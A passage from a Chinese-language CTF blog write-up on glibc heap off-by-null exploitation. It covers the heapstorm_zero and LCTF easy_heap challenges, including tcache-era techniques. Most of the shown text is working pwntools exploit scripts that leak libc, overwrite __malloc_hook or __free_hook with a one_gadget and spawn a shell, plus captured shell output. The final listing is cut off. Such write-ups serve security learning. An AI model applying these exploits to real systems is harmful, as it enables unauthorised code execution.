&apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"># 此时会有 指针交叉</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line"></span><br><span class="line">###  再次 shrink chunk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line"></span><br><span class="line">view(4)</span><br><span class="line">p.recvuntil(&apos;Content: &apos;)</span><br><span class="line">lbase = u64(p.recvuntil(&apos;\n&apos;)[:-1].ljust(8, &apos;\x00&apos;)) - 0x3c4b20 - 88</span><br><span class="line">success(&apos;lbase: &apos; + hex(lbase))</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 让 heap 回到 shrink chunk 后的情况</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">32: 0x0</span><br><span class="line">48: 0x0</span><br><span class="line">64: 0x0</span><br><span class="line">80: 0x0</span><br><span class="line">96: 0x0</span><br><span class="line">112: 0x0</span><br><span class="line">128: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">512: 0x603040 —▸ 0x2aaaab097d68 (main_arena+584) ◂— 0x603040 /* u&apos;@0`&apos; */</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/4xg 0x603040</span><br><span class="line">0x603040:       0x6161616161616161      0x0000000000000201</span><br><span class="line">0x603050:       0x00002aaaab097d68      0x00002aaaab097d68</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">add(0x18, &apos;A&apos; * 0x10)  # 1</span><br><span class="line">add(0x28, &apos;B&apos; * 0x20)  # 2</span><br><span class="line">add(0x38, &apos;C&apos; * 0x30)  # 3</span><br><span class="line">add(0x18, &apos;D&apos; * 0x10)  # 9</span><br><span class="line"></span><br><span class="line">pay = p64(0) + p64(0x41)</span><br><span class="line">add(0x18, pay)  # 6</span><br><span class="line">add(0x28, &apos;asd&apos;)</span><br><span class="line">add(0x38, &apos;zxc&apos;)  # 5,c</span><br><span class="line">add(0x28, &apos;qqq&apos;)  # 6,d</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a1&apos;)  # 14</span><br><span class="line">add(0x28, &apos;a2&apos;)  # 15</span><br><span class="line"></span><br><span class="line"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span><br><span class="line"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span><br><span class="line">dele(5)</span><br><span class="line">dele(14)</span><br><span class="line">dele(0xc)</span><br><span class="line"></span><br><span class="line">dele(6)</span><br><span class="line">dele(15)</span><br><span class="line">dele(0xd)</span><br><span class="line"></span><br><span class="line">add(0x28, p64(0x41))</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line"></span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8))</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8 + 0x20) + &apos;\x00&apos; * 0x10 + p64(0x41))</span><br><span class="line">add(0x38, &apos;\x00&apos; * 0x20 + p64(lbase + libc.sym[&apos;__malloc_hook&apos;] - 0x18))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 把 unsorted bin 分配掉</span><br><span class="line">add(0x18, &apos;a&apos; * 0x18)</span><br><span class="line"></span><br><span class="line"># 使用 top_chunk 分配，此时 top_chunk 位于 malloc_hook 上方， 修改 malloc_hook</span><br><span class="line">add(0x18, p64(lbase + 0xf02a4) * 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span><br><span class="line"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span><br><span class="line">dele(6)</span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [DEBUG] Received 0x5b bytes:</span><br><span class="line">    &quot;*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***\n&quot;</span><br><span class="line">*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***</span><br><span class="line">$ id</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;id\n&apos;</span><br><span class="line">[DEBUG] Received 0x84 bytes:</span><br><span class="line">    00000000  75 69 64 3d  31 30 30 30  28 6a 69 6e  67 29 20 67  │uid=│1000│(jin│g) g│</span><br><span class="line">    00000010  69 64 3d 31  30 30 30 28  6a 69 6e 67  29 20 e7 bb  │id=1│000(│jing│) ··│</span><br><span class="line">    00000020  84 3d 31 30  30 30 28 6a  69 6e 67 29  2c 34 28 61  │·=10│00(j│ing)│,4(a│</span><br><span class="line">    00000030  64 6d 29 2c  32 34 28 63  64 72 6f 6d  29 2c 32 37  │dm),│24(c│drom│),27│</span><br><span class="line">    00000040  28 73 75 64  6f 29 2c 33  30 28 64 69  70 29 2c 34  │(sud│o),3│0(di│p),4│</span><br><span class="line">    00000050  36 28 70 6c  75 67 64 65  76 29 2c 31  31 33 28 6c  │6(pl│ugde│v),1│13(l│</span><br><span class="line">    00000060  70 61 64 6d  69 6e 29 2c  31 32 38 28  73 61 6d 62  │padm│in),│128(│samb│</span><br><span class="line">    00000070  61 73 68 61  72 65 29 2c  39 39 39 28  64 6f 63 6b  │asha│re),│999(│dock│</span><br><span class="line">    00000080  65 72 29 0a                                         │er)·││</span><br><span class="line">    00000084</span><br><span class="line">uid=1000(jing) gid=1000(jing) 组=1000(jing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(docker)</span><br></pre></td></tr></table></figure><h2 id="另一种布局"><a href="#另一种布局" class="headerlink" title="另一种布局"></a>另一种布局</h2><p>为进一步理解 off by null , 下面以另一个 exp 的信息泄露过程为例介绍下堆的布局</p><p>来源 <a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a><br>首先分配若干个 chunk , 释放掉其中的第一个 chunk ，利用 scanf 触发堆合并构造 smallbin<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"AAA\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    add(<span class="number">0x38</span>, <span class="string">"A"</span> * <span class="number">8</span> + str(i) + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发堆合并， 构造 2 个 ， smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure></p><p>此时 chunk 10 的 pre_size 为 0x180 , pre_inused = 0.</p><p><img alt="" data-src="/imgs/off-by-null-5.png" class="lozad"><br>图中颜色定义如下<br><img alt="" data-src="/imgs/off-by-null-6.png" class="lozad"></p><p>然后分配一个 0x40 的 chunk , 此时会用 0x180 大小的 smallbin 分配，分配后应该剩下 0x140 大小的 unsorted bin (bin 切割后会保存在 unsorted bin ) , 然后利用 off by null , 修改 unsorted bin 的大小为 0x100. 此时会出现 0x40 的空隙。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配比较大的内存，使用较大的 smallbin , 分配完后利用 off by null</span></span><br><span class="line"><span class="comment"># shrink unsorted bin 的大小</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"B"</span> * <span class="number">0x30</span> + p64(<span class="number">0x120</span>))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-7.png" class="lozad"></p><p>下面在分配两个 chunk (4 5) , 然后释放 chunk 4 , 在利用 堆合并 将 fastbin 放入 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造 smallbin 为 合并时的 unlink 做准备</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"C"</span> * <span class="number">0x30</span> + p32(<span class="number">0x40</span>) + <span class="string">'\n'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"P"</span> * <span class="number">0x30</span> + <span class="string">'\n'</span>)  <span class="comment"># 5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># 触发堆合并，形成 smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-8.png" class="lozad"></p><p>然后把 chunk 10 释放掉， 此时系统根据 chunk 10 的 pre_size 找到 smallbin 的位置进行合并， 由于 smallbin 此时已经在链表中，所以可以成功完成合并过程中的 unlink 操作， 然后会得到一个很大的 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 释放 chunk 10, 同时触发堆合并，形成 overlap chunk , 测试 chunk 5 被 overlap</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局如下图<br><img alt="" data-src="/imgs/off-by-null-9.png" class="lozad"></p><p>通过合并我们得到了一个 0x180 大小的 smallbin , 在这个大 smallbin 里面有一个还在使用的 chunk 5 , 同时还有之前分配剩下的 0x80 大小的 smallbin. 这样我就得到了 overlap heap.</p><p>下面新建 3 个 chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">"DDD\n"</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"KKK\n"</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"EEE\n"</span>)  <span class="comment"># 7</span></span><br></pre></td></tr></table></figure><p>由于malloc 分配内存的机制，会先从 0x80 的 smallbin 里面分配，然后才会去 0x180 的 smallbin 分配，所以内存布局如图。</p><p><img alt="" data-src="/imgs/off-by-null-10.png" class="lozad"></p><p>分配完成后 chunk 5 变成了 0x140 大小的 unsorted bin 的起始位置，于是可以利用 Puts 功能把 unsorted bin 的 指针打印出来， leak libc</p><h2 id="Tcache下的利用"><a href="#Tcache下的利用" class="headerlink" title="Tcache下的利用"></a>Tcache下的利用</h2><p>这是 lctf 的 easyheap , 用的是 libc 2.27 , 已经使用了 tcache</p><p>题目地址:<br><a href="https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap" target="_blank" rel="noopener">https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap</a> </p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>程序逻辑比较简单，漏洞位于 分配内存后，写内存时，如果 设置要 size 为 0xf8 就会 在 buf[0xf8] 写入一个字节。而 buf 是 0xf8 大小， 会有一字节的溢出。</p><p><img alt="" data-src="/imgs/off-by-null-11.png" class="lozad"></p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>由于有 tcache 的存在利用 off by null 基本不可能，所以 off by null 要想办法去溢出 非 tcache bin 和 fastbin .</p><p>每个 tcache 最多 7 个 chunk , 所以可以先填满 7 个 chunk 到 tcache 后续的 chunk 就会进入 unsorted bin 里面了。</p><p>首先分配 10 个 chunk , 释放掉后面 7 个这7 个进入 tcache , 然后释放 前面 3 个，这3 个会进入 unsorted bin , 这个过程会在 chunk 2 的 pre_size 写入 0x200.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局为</p><p><img alt="" data-src="/imgs/off-by-null-12.png" class="lozad"></p><p>接下来利用 off by null 构造 overlap chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先 释放 chunk 7 , 它会进入 unsorted bin， 设它为 C .</li><li>然后分配一个 chunk 0, 消耗一个 tcache, 为后面做准备。</li><li>然后释放 chunk 8 , 此时 tcache 还有一个空位，会进入 tcache 设它为 B. 再次分配 chunk ,此时会再次拿到 刚刚释放的 B ,保存在 索引 1 （以后称它为 chunk 1）的位置， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</li><li>然后释放 chunk 9 , 由于 pre_size 和 pre_inused ，系统会找到 C , 然后把 C unlink , 由于此时 C 在 unsorted bin 链表上，会 正常 unlink , 之后形成一个 0x300 的 unsorted bin , 里面包含了 还在使用状态的 B</li></ul><p><img alt="" data-src="/imgs/off-by-null-13.png" class="lozad"></p><p>下面利用 unsorted bin 的切割机制，让指针落入 chunk 1 ， 然后利用 Puts 打印出来， leak libc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 把剩下的 tcache 里面的 bin 消耗掉</span><br><span class="line">for i in range(7):</span><br><span class="line">    malloc(8, &apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span><br><span class="line">malloc(1, &apos;8&apos;)</span><br></pre></td></tr></table></figure><p>首先把 tcache 使用掉，然后分配一个 chunk ,此时 chunk 1 会变成 unsorted bin 的起始地址。</p><p>然后打印 chunk 1 的内容，拿到 libc 的地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br></pre></td></tr></table></figure></p><p>下面利用 tcache 的机制, 让两个 一样的 bin 链入 tcache ，为后续做准备。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分配到 chunk 1, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)  <span class="comment"># 为了给后续申请腾出空间</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先分配一 个 chunk , 这时 索引 1， 9 指向同一个 chunk，设这个 chunk 的名称为 A。</li><li>然后连续释放 1 和 9 ， 此时 tcache 里面会有两个 A .</li></ul><p><img alt="" data-src="/imgs/off-by-null-14.png" class="lozad"></p><p>然后在通过修改 tcache 的指针实现分配到 __free_hook, 修改 free_hook 为 one_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-15.png" class="lozad"><br>最后触发 free , 调用 one_gadget ，拿到 shell.</p><p>完整exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-v']</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">"easy_heap"</span></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">bin = ELF(path)</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size'</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'content'</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    <span class="keyword">return</span> u64((p.recvline()[:<span class="number">-1</span>]).ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 tcache 分配</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配 unsorted bin</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'7'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次让 chunk 回到 tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把剩下的 tcache 里面的 bin 消耗掉</span></span><br><span class="line"><span class="keyword">for</span> i <span 